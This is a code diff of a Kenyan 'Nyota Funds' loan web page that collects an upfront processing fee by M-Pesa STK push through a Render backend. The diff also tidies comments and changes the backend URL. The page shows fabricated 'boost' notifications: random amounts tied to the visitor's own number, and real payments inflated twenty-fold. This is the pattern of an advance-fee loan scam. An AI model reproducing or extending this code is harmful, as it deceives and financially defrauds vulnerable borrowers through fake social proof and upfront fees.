@@ -56,16 +56,15 @@
         min-width: 280px;
         border-left: 4px solid #ffc107;
     }
- .notification.show { transform: translateX(0); }
- .notification-icon { font-size: 24px; }
- .notification-text { font-size: 14px; }
- .notification-text b { color: #0d47a1; }
+.notification.show { transform: translateX(0); }
+.notification-icon { font-size: 24px; }
+.notification-text { font-size: 14px; }
+.notification-text b { color: #0d47a1; }
 
     </style>
 </head>
 <body>
 
-<!-- NOTIFICATION CONTAINER -->
 <div id="notificationContainer"></div>
 
 <div id="s1" class="screen active">
@@ -137,12 +136,11 @@
 </div>
 
 <script>
-// WEKA LINK YAKO YA RENDER HAPA
-const BACKEND_URL = "https://nyota-backend.onrender.com";
+// LINK YAKO YA RENDER IMEWEKWA HAPA
+const BACKEND_URL = "https://nyota-funds-kenya-r7pj.onrender.com";
 
 let selectedLoan = 0, selectedFee = 0;
 
-// GENERATE LOANS: Start 5000 fee 350, then +150 each step, up to 80000
 const loanList = document.getElementById('loanList');
 let currentFee = 350;
 for(let loan = 5000; loan <= 80000; loan += 5000){
@@ -150,7 +148,7 @@ for(let loan = 5000; loan <= 80000; loan += 5000){
         <h3>KSh ${loan.toLocaleString()}</h3>
         <p>Processing Fee: KSh ${currentFee.toLocaleString()} | Repay in 30 days</p>
     </div>`;
-    currentFee += 150; // ongeza 150 kwa kila step
+    currentFee += 150;
 }
 
 function show(n){
@@ -161,7 +159,6 @@ function show(n){
 
 document.getElementById('form1').addEventListener('submit', e=>{
     e.preventDefault();
-    // Onyesha notification ya mtu amebost Screen 1
     const phone = document.getElementById('phone').value;
     const randomBoost = [5000, 10000, 20000, 30000, 50000][Math.floor(Math.random()*5)];
     showNotification('254'+phone.substring(1), randomBoost);
@@ -178,7 +175,6 @@ function selectLoan(loan, fee){
     setTimeout(()=>show(3), 300);
 }
 
-// FUNCTION YA NOTIFICATION
 function showNotification(phone, amount) {
     const maskedPhone = phone.substring(0, 6) + 'XXXX' + phone.substring(10);
     const notif = document.createElement('div');
@@ -216,7 +212,6 @@ async function paySTK(){
     show(4);
 
     try {
-        // TUMIA BACKEND LINK
         const response = await fetch(`${BACKEND_URL}/pay`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
@@ -233,14 +228,14 @@ async function paySTK(){
             btn.innerText = 'Pay Fee & Get Loan';
         }
     } catch(e){
-        alert('Server haipatikani. Hakikisha umedeploy kwa Render');
+        alert('Server haipatikani. Subiri 1min Render inawake');
         show(3);
         btn.disabled = false;
         btn.innerText = 'Pay Fee & Get Loan';
     }
 }
 
-// Soma boosts za kweli kutoka backend kila 5s kwa Screen 1
+// Soma boosts za kweli kutoka backend kila 5s
 setInterval(async () => {
     const activeScreen = document.querySelector('.screen.active').id;
     if(activeScreen === 's1'){
@@ -249,7 +244,6 @@ setInterval(async () => {
             const data = await res.json();
             if(data.length > 0){
                 const lastBoost = data[0];
-                // multiply by 20 kama example ya loan amount
                 showNotification(lastBoost.phone, lastBoost.amount * 20);
             }
         }catch(e){}
@@ -258,4 +252,4 @@ setInterval(async () => {
 
 </script>
 </body>
-  </html>
+</html>
